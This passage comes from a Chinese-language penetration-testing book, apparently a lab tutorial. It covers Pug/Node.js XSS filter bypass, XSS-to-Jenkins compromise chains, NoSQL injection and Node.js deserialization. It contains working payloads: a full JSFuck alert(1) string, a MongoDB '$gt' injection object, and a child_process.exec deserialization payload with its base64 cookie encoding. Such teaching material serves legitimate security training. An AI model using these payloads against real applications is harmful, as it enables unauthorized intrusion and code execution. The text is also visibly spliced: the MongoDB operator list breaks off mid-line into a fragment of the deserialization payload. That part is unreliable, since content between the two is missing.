练习5
假设我们访问一个使用转义字符串插值和某种类型过滤的应用程序。在下面的练习中，我们在Node.js服务器中执行最小的黑名单过滤脚本，删除“”和“alert”等字符。但是，再次错误地将转义字符串插值放在脚本标记中。如果可以在那里放置JavaScript脚本，就可以实施XSS攻击。
跳到示例＃5。
Pug模板源代码。 
name5 = req.query.name5.replace(/[;'"<>=]|alert/g,"")
script
varuser3 =＃{name5};
尝试输入静荷。 
尝试使用alert(1)，但由于过滤器，这个操作并起作用。还可以尝试，但是转义代码和过滤器阻止执行。如果想执行alert(1)静荷，那么该如何做呢？
我们需要弄清楚如何规避过滤器，插入原始JavaScript。JavaScript非常强大并且具有很多功能。我们可以利用这些功能来生成一些有创意的静荷。规避这些过滤器的一种方法是使用深奥的JavaScript表示法。这可以在JSFuck的站点创建。正如您下面看到的，通过使用中括号、小括号、加号和感叹号，我们可以重新创建规则alert(1)。
JSFuck静荷。
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[]) [!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
如您所知，许多浏览器已开始集成XSS防护机制。我们已经使用这些静荷来绕过某些浏览器保护机制，如图3.14所示。在Kali之外，您可以尝试在实际使用的浏览器中加载这些静荷，例如Chrome。
图3.14
对于复杂的应用程序，很难保证不出现XSS漏洞。对于框架如何处理输入和输出，很容易出现理解错误或者忘记处理的情况。因此，在对Pug/Node.js应用程序执行源代码审查时，在源代码中搜索 !{、＃{或`$ {有助于找到XSS的位置。了解代码上下文以及是否需要在该上下文中进行转义至关重要，我们将在后面的示例中认识到这一点。
虽然上面的攻击方式是针对Node和Pug系统的，但是其实每种语言都存在XSS漏洞和输入验证的问题。您不需要运行漏洞扫描程序或XSS模糊测试工具，找到所有XSS漏洞，您需要做的是了解所使用的语言和框架。
3.3.9 从XSS漏洞到突破目标
我经常遇到的一个问题是，如何从 XSS 漏洞拓展，实现获取 Shell？虽然有很多不同的方式实现这个目标，但我们通常会发现，如果可以在内容管理系统（CMS）或类似设备中找到用户-管理员类型的XSS，那么就能够完全突破系统。全部的演示示例和代码可以在Hans-Michael Varbaek处获取。Hans-Michael提供了一些关于从XSS漏洞到远程执行攻击的精彩示例和视频。
我喜欢使用自定义红队攻击方式，主要是借助JavaScript的功能。我们通过BeEF（Browser Exploitation Framework，浏览器开发框架）了解到JavaScript非常强大。因此，我们可以利用所有这些功能，对不知情的被攻击者实施攻击。这个静荷会做什么？攻击的一个示例是让被攻击者的计算机运行JavaScript XSS静荷，获取被攻击者的内部（自然）IP地址。然后，我们基于这些 IP 地址，使用静荷扫描其内部网络。如果找到了一个已知的 Web应用程序，那么在不进行身份验证的情况下即可突破，我们可以发送恶意静荷到该服务器。
例如，我们的目标可能是Jenkins服务器，在未经身份验证的情况下，可以完成远程代码的执行。要查看XSS与Jenkins突破的完整过程，可参阅第5章中关于使用社会工程学渗透内部Jenkins服务器的内容。
3.3.10 NoSQL数据库注入
在本书的前两版中，我们花费相当长的时间介绍如何使用SQLMap进行SQL注入。除增加一些混淆以及集成到Burp Suite工具以外，本书与第2版在这方面相比没有太大变化。但是我想深入研究NoSQL注入，因为这些数据库变得越来越普遍。
MySQL、MS SQL和Oracle等传统SQL数据库依赖于关系数据库中的结构化数据。这些数据库是关系型的，这意味着一个表中的数据与其他表中的数据有关。这使执行查询操作很方便，例如“给我列出所有在过去30天内购买东西的客户”。这些数据的问题在于整个数据库中数据的格式必须保持一致。NoSQL数据库中的数据通常不遵循SQL查询数据库中的表格/关系模型。这些数据称为“非结构化数据”（如图片、视频和社交媒体），并不适用于我们大量收集数据。
NoSQL特性如下。
NoSQL数据库类型：Couch/MongoDB。
非结构化数据。
水平增长。
在传统的SQL注入中，攻击者会尝试跳出SQL查询，并在服务器端修改查询操作。使用NoSQL注入，攻击可以在应用程序的其他区域中执行，而不是在传统的SQL注入中执行。此外，在传统的SQL注入中，攻击者会使用标记来跳出语句。在NoSQL注入攻击中，NoSQL漏洞通常是由于字符串解析或者赋值操作造成的。
NoSQL注入中漏洞通常在以下情况下发生：向NoSQL数据库提出请求，端点接收JSON数据；我们能够操纵NoSQL查询，使用比较运算符更改操作查询。
NoSQL注入的一个常见例子是注入以下的数据：[{"$gt":""}]。这个JSON对象的含义是运算符（$gt）大于NULL ("")。由于逻辑上所有内容都大于NULL，因此JSON对象始终是正确的，允许我们绕过或注入NoSQL查询。这相当于SQL注入中的[' 或者 1=1--]。在MongoDB中，我们可以使用以下条件运算符之一。
(>) 大于 - $gt。
(=) 小于或等于 - $gte。
(>/opt/web/chatSupportSystems/public/hacked.txt', function(error, stdout, stderr) { console.log(stdout) });}()"}
由于原始 Cookie 已经编码，因此我们需要使用 Burp 解码器/编码器对静荷进行base64编码。 
示例静荷，如图3.21所示 eyJ0aHAiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY 2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2VjaG8gbm9kZSBkZXNlcmlhbGl6YX Rpb24gaXMgYXdlc29tZSEhID4+IC9vcHQvd2ViL2NoYXRTdXBwb3J0U3lz dGVtcy9wdWJsaWMvaGFja2VkLnR4dCcsIGZ1bmN0aW9uKGVycm9yLCBz dGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9
注销，打开Burp拦截，并转发请求/（home）。 